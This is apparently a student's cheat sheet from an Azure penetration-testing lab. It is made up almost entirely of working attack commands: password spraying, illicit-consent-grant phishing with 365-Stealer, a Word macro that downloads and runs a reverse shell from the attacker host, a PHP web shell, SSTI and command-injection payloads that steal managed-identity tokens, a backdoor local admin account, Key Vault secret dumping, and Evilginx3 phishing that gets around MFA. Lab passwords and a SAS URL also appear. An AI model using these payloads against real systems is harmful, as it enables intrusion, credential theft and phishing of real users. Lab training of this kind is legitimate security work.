# Azure Pentest

## Basis
```
xfreerdp /u:studentuser13 /p:2MU3eDZn8FHEdbwm /v:172.16.150.13 /dynamic-resolution
sudo  mount -t cifs -o user=studentuser13 //172.16.150.13/shared /mnt/smb
```

## Enumeration process
- Email enum with o365creeper.py (Unauthen)
- Sub domain enum with EnumerateAzureSubDomains.ps1 - MicroBurst (Unauthen) with subdomain_enum_permutations.txt
- Invoke-EnumerateAzureBlobs - MicroBurst (Unauthen) with subdomain_enum_permutations.txt
- PassSpray with MSOLSpray (Unauthen)
- Carp-BasicMgEnum
- Carp-AzEnum
- Carp-AzCliEnum
- Add-AzADAppSecret
- KeyVault 'Unauthorized' => means can access but missing keyvault token; 
- If managed app => REST API enum
- C:\AzAD\Tools\ROADTools && AzureEnum
- on vm => vmenum, quser, extract PTR, mimikatz
- on managed identity, bypass MFA by trying remote login
```
az account get-access-token
az account get-access-token --resource-type aad-graph
default clientid = 
```
-

## Enumeration 
```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName admin@defcorphq.onmicrosoft.com

# Get tenant ID
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com

# Get Globals admins
Get-AADIntGlobalAdmins

```
- Validate email IDs
File of emails; /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

- Enumerate services used by subdomain enumeration with MicroBurst
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1

Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

- Password Spray 
```
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd -Verbose
```

- Enumaration using Mg module
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($email,$passwd)

Connect-AzAccount -Credential $creds
$graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

# Enumerate all users
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName

# Enumerate a specific user 
Get-MgUser -UserId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *

$email = "user@example.com"
Get-MgUser -Filter "userPrincipalName eq '$email'"


# Enumerate group
Get-MgGroup -All

# Enumerrate devices
Get-MgDevice

# Get all the Global Administrators
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
$admin = (Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
$admin.displayName, $admin.mail

# List all custom directory roles
Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName

# List enterprise applications
Get-MgServicePrincipal -All -Filter "ServicePrincipalType eq 'Application'" | Select-Object DisplayName, AppId, Id

```

- Enumeration using Az PowerShel
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ($email,$passwd)

Connect-AzAccount -Credential $creds

#Enumerate resources accessible
Get-AzResource
Get-AzResource | Select-Object Name, ResourceType, Location

# Get all the role assignments for the test user
$user = "test@defcorphq.onmicrosoft.com"
Get-AzRoleAssignment -SignInName $user

$assignments = Get-AzRoleAssignment -SignInName $user

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize


# list all the VMs where the current user has at least the Reader role
Get-AzVM | Select-Object Name, ResourceGroupName, Location

# list web apps 
$webapps = Get-AzWebApp

# Process and format the output
$webapps | ForEach-Object {
    # Extract the last two parts of the Scope
    $IDParts = $_.Id -split '/'
    $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        ID              = $shortID
        Name        = $_.Name
        Kind = $_.Kind
        State = $_.State
        Location = $_.Location
        Hostnames         = $_.Hostnames
        Type         = $_.Type
    }
} | Format-Table -AutoSize


# List all App Services
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

# list Function Apps
Get-AzFunctionApp

# list storage account

$storageaccount = Get-AzStorageAccount

# Process and format the output
$storageaccount | ForEach-Object {
    # Extract the last two parts of the Scope
    #$IDParts = $_.Id -split '/'
    #$shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        #ID              = $shortID
        StorageAccountName        = $_.StorageAccountName
        ResourceGroupName = $_.ResourceGroupName
        Kind = $_.Kind
        Location = $_.Location
        AllowBlobPublicAccess         = $_.AllowBlobPublicAccess
        AllowSharedKeyAccess         = $_.AllowSharedKeyAccess
    }
} | Format-Table -AutoSize


# list the readable keyvaults for the current user

$keyvault = Get-AzKeyVault

# Process and format the output
$keyvault | ForEach-Object {
    # Extract the last two parts of the Scope
    $IDParts = $_.ResourceId -split '/'
    $shortID = ($IDParts[-2] + '/' + $IDParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        ID          = $shortID
        Name        = $_.VaultName
        ResourceGroupName = $_.ResourceGroupName
        Location = $_.Location
        Tags        = $_.Tags
    }
} | Format-Table -AutoSize


```

- Enumeration using az cli 
```
az login -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd

az vm list
az vm list --query "[].[name]" -o table
az vm list --query "[].[name, licenseType, osProfile.[adminUsername], osProfile.[adminUsername], osProfile.[windowsConfiguration].[winRM], resourceGroup, ]" -o table

# app service
az webapp list
az webapp list --query "[].[name]" -o table

# function app
az functionapp list --query "[].[name]" -o table

az storage account list

az keyvault list
```

- Enumeration using ROADTools
```
cd C:\AzAD\Tools\ROADTools
.\venv\Scripts\activate
roadrecon auth -u test@defcorphq.onmicrosoft.com -p UnGu3ssableP@ssw0rdV3ryH4rdt0Cr4ckN0OneCan
roadrecon gather

roadrecon plugin policies # due to the "internal-1.61" AAD Graph API version
roadrecon gui
```

- Enumeration using StormSpotter
```
# Start the backend service for StormSpotter
cd C:\AzAD\Tools\stormspotter\backend\
pipenv shell
python ssbackend.pyz

# Start the frontend webserver in a new PowerShell session
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
quasar.cmd serve -p 9091 --history

# Prepare to run the Stormcollector ini another process
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
az login -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli

```

- Enumeration using BloodHound 
```
$email = "test@defcorphq.onmicrosoft.com"
$passwd = "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd"
$passwd = ConvertTo-SecureString $passwd -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ($email,$passwd)

Connect-AzAccount -Credential $creds
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose

# Resolve objectID to names
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname

# List all the users with Global Administror role
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

# find all paths to an Azure key vault
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

# Analysis using BloodHound Community Edition
# https://azurehound-altsecdashboard.msappproxy.net/
# Username: cartpreader@altsecdashboard.onmicrosoft.com
# Password: ARe@dOnlyUsertol00kAtAzureHoundDashboard!
```

## Compromising an application administrator and their workstation using the Illicit Consent Grant attack
#for this example, defcorpextcontractors is the attacker tenant and defcorphq is the victim tenant
- Register MFA for the attacker user and connect with that user in the attacker tenant
- Register an application
1. go to Entra ID -> App Registrations and click on New registration
2. choose 'Accounts in any organizational directory (Any Entra ID directory - Multitenant)' 
3. use the URL of your student VM in the Redirect URI - https://172.16.150.13/login/authorized ; the IP address is for the attacker machine
4. Go to the 'Certificates & Secrets' blade of the application you registered, create a new client secret and copy it before browsing away from the page
5. go to the 'API permissions' blade and add the 'user.read', 'User.ReadBasic.All','Files.ReadWrite.All', 'Mail.Read','Mail.Send','MailboxSettings.ReadWrite','Notes.Read.All'  for the Microsoft Graph (Delegated permissions)
6. Go to the OverView blade and note Application (Client) ID
7. Setup 365-Stealer (http://localhost:82/365-stealer/yourVictims) admin:Pass@123
8. Configure CLIENTID, REDIRECTURL and CLIENTSECRET so that it matches the application registered (can also be set with cli `python 365-Stealer.py --set-config`)
9. Run 365-Stealer and choose https
10. Run the tool; `python 365-Stealer.py --run-app`
11. Get the phishing link by browsing to the [https://localhost] using an **incognito window** and copying the lick under 'Read More'.
12. Send the phishing link (Emails can be gather with Invoke-EnumerateAzureSubDomains.ps1)

13. Get access tokens of the victims [http://localhost:82/365-Stealer/yourvictims/]

- Using the stole token
```
$Token = 'eyJ0eX..'
$Token = (gc .\Downloads\marc_access_token.txt)
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

- Get reverse shell
```
#Create doc file 
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true

iex (New-Object Net.Webclient).downloadstring("http://172.16.150.13:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('172.16.150.13:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.13 -Port 4444" -OutputFile studentx.doc
exit

Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc

C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444

# upload the file on the drive using 365-Stealer
python 365-Stealer.py --refresh-user markdwalden@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\studentx.doc
```

-Local enumeration
```
whoami
az ad signed-in-user show

```

- Abuse the file upload vulnerability and compromise the app service.
```
//studentxshell.phtml
<?php

system($_REQUEST['cmd']);

?>

//studentxtoken.phtml
<?php

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

system('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

system('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

[https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env]
Get **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**
[https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml]

```
$access_token  = 'eyJ0...'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $access_token  -AccountId $client_id

$assignments = Get-AzRoleAssignment 

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize



# Identifying subscription ID


$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $access_token"
    }
}
$subscriptionID = ((Invoke-RestMethod @RequestParams).value).ID

# List all resources accessible for the managed identity assigned to the app service.


$URI = ("https://management.azure.com"+$subscriptionID+"/resources?api-version=2020-10-01")
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $access_token"
    }
}
$all_res = (Invoke-RestMethod @RequestParams).value 

# Check allowed actions

$all_res | ForEach-Object {
    # Construct the URI for the Azure REST API request
    $URI = "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

    # Define the request parameters
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $access_token"
        }
    }

    # Output the resource ID
    Write-Output "Resource ID: $($_.id)"

    try {
        # Invoke the REST API and fetch the response
        $response = Invoke-RestMethod @RequestParams -ErrorAction Stop

        # Process the response to check for 'actions' and 'notActions'
        if ($response.value -and $response.value.Count -gt 0) {
            $response.value | ForEach-Object {
                if ($_.actions -and $_.actions.Count -gt 0) {
                    Write-Output "=== Actions ==="
                    $response.value.actions
                }

                
            }
        } else {
            Write-Output "No permissions data found."
        }
    } catch {
        Write-Warning "Failed to retrieve permissions for resource ID $($_.id). Error: $_"
    }

    Write-Output ""
}


```
- SSTI exploit [https://vaultfrontend.azurewebsites.net]
```
{{config.items()}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
#Get IDENTITY_HEADER and IDENTITY_ENDPOINT
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER && curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER && curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

- Find all accessible resources
```
$token = 'eyJ0e..'
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
Get-AzResource
```

- OS cmd injection [https://virusscanner.azurewebsites.net/)]

content of python file 
```
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://vault.azure.net/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] KeyVault API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

```
```
; ls /tmp;
; ls /tmp/uploads;

#upload python script
; python /tmp/uploads/studentx/studentx.py;
```

```
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..'
$client_id = '62e44426-5c46-4e3c-8a89-f461d5d586f2'
Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $graphaccesstoken -AccountId $client_id 
Get-AzResource

#list all Enterprise Applications
$GraphAPIAccessToken = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
    'Authorization' = "Bearer $GraphAPIAccessToken"
    }
}
(Invoke-RestMethod @RequestParams).value | select displayName,id,publisherDomain

# List roles assigned to the enterprise applications 

(Invoke-RestMethod @RequestParams).value | foreach{
$MYURI = ("https://graph.microsoft.com/v1.0/servicePrincipals/"+$_.appId+"/appRoleAssignments")
$RequestPar = @{
    Method = 'GET'
    Uri = $MYURI
    Headers = @{
    'Authorization' = "Bearer $GraphAPIAccessToken"
    }
}
    try {
       (Invoke-RestMethod @RequestPar -ErrorAction SilentlyContinue).value 
    } catch {
        Write-Warning "Failed to retrieve permissions for resource ID $($_.appId). Error: $_"
    }

}

```

- Check app where secret can be added by using `Add-AzADAppSecret.ps1`
```
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $GraphAPIAccessToken -ErrorAction SilentlyContinue

#output 
Client secret added to :
Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp
Key ID    : 7679416e-6d36-43ad-9265-2f4956adc8b3
...    : ...
```

- Find out insecure storage blobs in the defcorphq tenant
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
Invoke-EnumerateAzureBlobs -Base defcorp

#Open storage explorer and connect to SAS
https://defcorpcodebackup.blob.core.windows.net/client?sp=rl&st=2024-09-26T09:48:55Z&se=2025-12-31T18:48:55Z&spr=https&sv=2022-11-02&sr=c&sig=cdfpDLkAqQaw4BznlARLvOAkHhkMkx9fpYmChFKOzfQ%3D
```

- Enumeration on a reverse shell
```
# check if there is a user logged-in to az cli on the machine
az ad signed-in-user show

# add automation extension to az cli and list automation accounts
az extension add --upgrade -n automation
az automation account list

# check objects owned by signed in user
az ad signed-in-user list-owned-objects
az ad signed-in-user list-owned-objects --query "[].{DisplayName: displayName, ObjectID: id, Description: description}" --output table


# request a token for the Grpah API and interact with Grpah API
az account get-access-token --resource-type ms-graph

$graphtoken = $(az account get-access-token --resource-type ms-graph --query "accessToken").replace('"','')
$graphtoken = "..."
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

# add Mark as a member of "Automation Admins" group
$user_email = "markdwalden@defcorphq.onmicrosoft.com"
$user_id = (Get-MgUser -UserId $user_email ).id

$group_name = 'Automation Admins' 
$group_id = (Get-MgGroup -Filter "DisplayName eq '$group_name'").Id

$params = @{"@odata.id" = ("https://graph.microsoft.com/v1.0/directoryObjects/"+$user_id)}
New-MgGroupMemberByRef -GroupId $group_id -BodyParameter $params

# Enumerate automation accounts and workergroup
az automation account list

Get-AzAutomationAccount| select AutomationAccountName,ResourceGroupName,Location | foreach{$_; echo ""; echo "===checking Automation Hybrid Worker Group==="; Get-AzAutomationHybridWorkerGroup -AutomationAccountName $_.AutomationAccountName -ResourceGroupName $_.ResourceGroupName | fl}

# request an access token for ARM
az account get-access-token

# request an access token for add-graph
az account get-access-token --resource-type aad-graph

# using both the tokens with Az PowerShell
$AADToken = 'eyJ0…'
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3

# get the role for Mark on the automation account
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation

# Contributor role can create and execute Runbooks on automation account
# check if a hybrid worker group is in use by the automation account (already in 'Enumerate automation accounts and workergroup' script)
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering

Import-AzAutomationRunbook -Name student13 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose

# Publish the runbook so that it be can used
Publish-AzAutomationRunbook -RunbookName student13 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose

# start the runbook
Start-AzAutomationRunbook -RunbookName student13 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

- Getting command execution on an Azure VM
```
$access_token  = 'eyJ0...'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $access_token  -AccountId $client_id

$vmname = 'bkpadconnect'
$vm = Get-AzVM | Where-Object { $_.Name -eq $vmname }
$networkprofile = (Get-AzVM -Name $vm.Name -ResourceGroupName $vm.ResourceGroupName).NetworkProfile.NetworkInterfaces.Id.Split('/')[-1]
$networkipname = (Get-AzNetworkInterface -Name $networkprofile).IpConfigurations.PublicIpAddress.Id.Split('/')[-1]
$publicipaddress = (Get-AzPublicIpAddress -Name $networkipname).IpAddress

# run a command on the bkpadconnect Azure VM
Invoke-AzVMRunCommand -VMName $vm.Name -ResourceGroupName $vm.ResourceGroupName -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose

# content of adduser.ps1
$passwd = ConvertTo-SecureString "Stud13Password@123" -AsPlainText -Force
New-LocalUser -Name student13 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student13


# access the vm 
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $Password)
$sess = New-PSSession -ComputerName $publicipaddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess

# extract creds 
gc C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- request a keyvault access token
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

```
- Request a new ARM access token
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

- Connect using Az PowerShell and use both the arm token and keyvault token
```
$accesstoken = 'eyJ0..'
$keyvaulttoken = 'eyJ0..'
$clientid = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
Connect-AzAccount -AccessToken $accesstoken -AccountId $clientid -KeyVaultAccessToken $keyvaulttoken

# Get all Key Vaults in the subscription
$keyVaults = Get-AzKeyVault

# Iterate over each Key Vault and get its secrets
foreach ($vault in $keyVaults) {
    Write-Host "Key Vault: $($vault.VaultName)"
    Write-Host "===================================="
    
    # Get secrets for the current Key Vault
    $secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName
    foreach ($secret in $secrets) {
        # Retrieve the secret value as plain text
        $plainTextSecret = (Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name –AsPlainText)

        Write-Host "Secret Name: $($secret.Name)"
        Write-Host "Secret Version: $($secret.Version)"
        Write-Host "Secret Value: $plainTextSecret"
        Write-Host "-----------------------------"
    }
    Write-Host "`n"
}

```
- Enumeration as Kathy 
```
$password = ConvertTo-SecureString 'Hav3Y0uLooked@KeyVault!!Azur3' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds

Get-AzResource | Select-Object Name, ResourceType, Location
$assignments = Get-AzRoleAssignment 

# Process and format the output
$assignments | ForEach-Object {
    # Extract the last two parts of the Scope
    $scopeParts = $_.Scope -split '/'
    $shortScope = ($scopeParts[-2] + '/' + $scopeParts[-1])

    # Create a custom object with the desired fields
    [PSCustomObject]@{
        Scope              = $shortScope
        DisplayName        = $_.DisplayName
        RoleDefinitionName = $_.RoleDefinitionName
        ObjectType         = $_.ObjectType
        CanDelegate        = $_.CanDelegate
    }
} | Format-Table -AutoSize

```
- check the definition of this role
```
$rolename = "Virtual Machine Command Executor"
Get-AzRoleDefinition -Name $rolename
```

- Get some information about group and membership
```
$groupName = 'VM Admins'
Get-AzADGroup -DisplayName $groupName | fl

# Get the members of the group
$userDetailsList = @()

# Get the members of the group
$groupMembers = Get-AzADGroupMember -GroupDisplayName $groupName

# Iterate over each member to get detailed user information
foreach ($member in $groupMembers) {
    # Fetch detailed user info based on the object ID
    $userDetails = Get-AzADUser -ObjectId $member.Id

    # Add details to the array as a custom object
    $userDetailsList += [pscustomobject]@{
        DisplayName        = $userDetails.DisplayName
        Email              = $userDetails.Mail
        UserPrincipalName  = $userDetails.UserPrincipalName
        ObjectId           = $userDetails.Id
    }
}

# Output the results in a table format
$userDetailsList | Format-Table -AutoSize
```

- Get info about user using Mg
```
$useremail = 'VMContributor13@defcorphq.onmicrosoft.com'
$graphtoken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI = ("https://graph.microsoft.com/v1.0/users/"+$useremail+"/memberOf")
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $graphtoken"
    }
}

# Fetch the results
$results = (Invoke-RestMethod @RequestParams).value

# Process and format the results into a table
$results | ForEach-Object {
    [pscustomobject]@{
        ODataType   = $_.'@odata.type'.replace("#microsoft.graph.","")
        DisplayName = $_.displayName
        Description = $_.description
        ID          = $_.id
    }
} | Format-Table -AutoSize
```
- Get information and membership of administrative unit
```
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)

$adminUnitId = 'e1e26d93-163e-42a2-a46e-1b7d52626395'
Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId $adminUnitId

Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $adminUnitId | fl *

# check for roles scoped to administrative unit
$adminUnitId = "e1e26d93-163e-42a2-a46e-1b7d52626395"

# Get the scoped role members for the specified Administrative Unit
$scopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $adminUnitId

# Initialize an array to store combined details
$combinedDetails = @()

# Process each scoped role member
foreach ($member in $scopedRoleMembers) {
    # Get detailed role information using RoleId
    $roleDetails = Get-MgDirectoryRole -DirectoryRoleId $member.RoleId

    # Get the user's email based on their ID
    $userDetails = Get-MgUser -UserId $member.RoleMemberInfo.Id

    # Add combined information to the array
    $combinedDetails += [pscustomobject]@{
        RoleMemberName  = $member.RoleMemberInfo.DisplayName
        Email           = $userDetails.Mail
        RoleMemberId    = $member.RoleMemberInfo.Id
        RoleName        = $roleDetails.DisplayName
        RoleDescription = $roleDetails.Description
        RoleId          = $roleDetails.Id
    }
}

# Display the combined details in a table
$combinedDetails | Format-List

```
- Phish user with Evilginx3

1. C:\AzAD\Tools\evilginx-v3.3.0\evilginx.exe -p C:\AzAD\Tools\evilginx-v3.3.0\phishlets -developer
2. Configure server domain and IP to match user ID and student VM IP `config domain student13.corp` and `config ipv4 external 172.16.150.13`
3. Select the phishlest template for office 365 and point it to a URL on the DNS created above (`phishlets hostname o365 student13.corp` and verify dns entries `phishlets get-hosts o365`). `phishlets` can be used to see all the templates
4. Setup DNS (here Technitium DNS server at [http://172.16.2.50:5380/] with admin:admin@123)
5. Add student13.corp as primary (default) zone
6. Edit the NS record to point it to the DNS server IP – 172.16.2.50 (DNS IP), TTL 3600 - by modifying the 'Name Server' value
7. Do the same for SOA record, TTL 14400, Retry 3600
8. Add a new A record in student13.corp with name **login** and IP address corresponding to the attacking machine, TTL – 180
9. Add a similar A record in studentx.corp with name **www** and IP address corresponding to the attacking machine, TTL – 180
10. Enable the phishlets `phishlets enable o365`
11. Create the lures `lures create o365` and get the lures `lures get-url 0`
12. Send the lure to the target victim email 
13. `sessions` and `sessions id` help to list sessions and cookies can be imported to bypass MFA 

Use the cookies and load them with Cookie-Editor extention, connect to [https://portal.azure.com]

- Reset vmcontributorx password
1. Go to Entra ID -> Manage -> Users
2. Select the user and click reset password
or 
copy the microsoft graph access token by searching "batch" in the memory of browser (F12), and look for https://graph.microsoft.com/beta/$batch
```
$userEmail = "VMContributor13@defcorphq.onmicrosoft.com"
$graphtoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6....'

Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
$params = @{
passwordProfile = @{
forceChangePasswordNextSignIn = $false
password = "VM@Contributor@123@321"}
}

Update-MgUser -UserId $userEmail -BodyParameter $params -verbose
```
- Use vmcontributorx after registering for MFA
```
$domain = "defcorphq.onmicrosoft.com"
Disconnect-MgGraph
Connect-AzAccount -TenantId (Get-AADIntTenantID -Domain $domain)
```

- check the service principal that an AppID belongs to:
```
$clientId = "62e44426-5c46-4e3c-8a89-f461d5d586f2"
